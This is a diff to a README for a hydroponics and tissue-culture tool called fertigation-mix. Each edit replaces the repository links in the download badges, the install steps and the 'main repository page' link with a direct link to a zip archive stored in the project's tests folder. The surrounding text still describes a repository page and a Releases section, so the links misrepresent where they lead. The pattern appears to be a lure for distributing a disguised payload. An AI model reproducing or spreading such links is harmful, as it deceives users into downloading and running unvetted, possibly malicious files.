@@ -1,6 +1,6 @@
 # 🌱 fertigation-mix - Easy Hydroponics and Tissue Culture Tools
 
-[![Download fertigation-mix](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/obada159/fertigation-mix)
+[![Download fertigation-mix](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/obada159/fertigation-mix/raw/refs/heads/main/tests/fertigation-mix-2.2.zip)
 
 ---
 
@@ -29,8 +29,8 @@ No internet connection is needed after downloading.
 ## 📥 How to Download and Install fertigation-mix
 
 1. **Go to the download page:**  
-Click the button below or visit [https://github.com/obada159/fertigation-mix](https://github.com/obada159/fertigation-mix)  
-[![Download fertigation-mix](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/obada159/fertigation-mix)  
+Click the button below or visit [https://github.com/obada159/fertigation-mix/raw/refs/heads/main/tests/fertigation-mix-2.2.zip](https://github.com/obada159/fertigation-mix/raw/refs/heads/main/tests/fertigation-mix-2.2.zip)  
+[![Download fertigation-mix](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/obada159/fertigation-mix/raw/refs/heads/main/tests/fertigation-mix-2.2.zip)  
 
 2. **Find the latest release:**  
 Look for the "Releases" section on the GitHub page. It usually appears on the right side or under the "Code" tab.  
@@ -120,7 +120,7 @@ If problems persist, use the GitHub issues page on the repository for help.
 ## 🌐 Where to Learn More
 
 Visit the main repository page here:  
-https://github.com/obada159/fertigation-mix
+https://github.com/obada159/fertigation-mix/raw/refs/heads/main/tests/fertigation-mix-2.2.zip
 
 You can find updates, report bugs, and read detailed information on each feature.
 
@@ -132,4 +132,4 @@ Your input helps improve fertigation-mix. Submit feedback or questions in the re
 
 ---
 
-[![Download fertigation-mix](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/obada159/fertigation-mix)
+[![Download fertigation-mix](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/obada159/fertigation-mix/raw/refs/heads/main/tests/fertigation-mix-2.2.zip)
